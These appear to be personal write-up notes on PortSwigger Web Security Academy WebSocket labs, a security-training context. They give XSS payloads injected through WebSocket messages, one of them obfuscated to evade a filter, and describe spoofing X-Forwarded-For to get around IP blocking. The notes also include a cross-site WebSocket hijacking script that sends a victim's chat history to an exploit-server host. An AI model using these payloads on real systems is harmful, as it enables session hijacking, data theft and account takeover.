# WebSockets

- https://portswigger.net/web-security/websockets
- https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking

## Manipulating WebSocket messages to exploit vulnerabilities

Live chat functionality uses web sockets for live server-client connection. When using a website form and intercepting WebSocket messages via Burp we can observe that characters like `<` or `>` gets html encoded.

Forwarding a massage to Burp Repeater, we can then sent pure message without encoding and notice, that the server responds with unencoded content and injects it into the page without sanitization.

Sendning below message to the server solves the lab

```
{"message":"<img src=X onerror='alert()'/>"}
```

## Manipulating the WebSocket handshake to exploit vulnerabilities

This time WAF is present and every IP that got flagged for commiting an attack gets blocked.

WebSocket handshake accepts and respects `X-Forwarded-For` header, which allows IP blocking bypass.

In order to bypass XSS filter and submit the same payload as above, we can change `onerror` tag name to pokemon case and html encode the content of it, since it will be decoded when run by browser anyway.

Resulting payload solving the lab:

```
{"message":"<img src=X oNeRrOr='&#97;&#108;&#101;&#114;&#116;&#40;&#41;'>"}
```

## Cross-site WebSocket hijacking

`GET /chat` request for WebSocket handshake does not contain any form of protection against `CSRF`, like `CSRT tokens`.

It looks like the chat is tied up to the session, which is represented by `session` cookie only. Changing the cookie and entering the chat page results in `No chat history`, but entering the previous cookie again retireves previous messages.

Delivering below page to the victim steals their chat history and let us review it in Exploit server Access logs.

```
<script>
    var ws = new WebSocket('wss://0a1f0047047e780583c30aa10001007b.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://exploit-0a4c00bd0440782c8348096901990061.exploit-server.net/?q=' + event.data);
    };
</script>
```

From now we can login as carlos and solve the lab, since his password was leaked here.
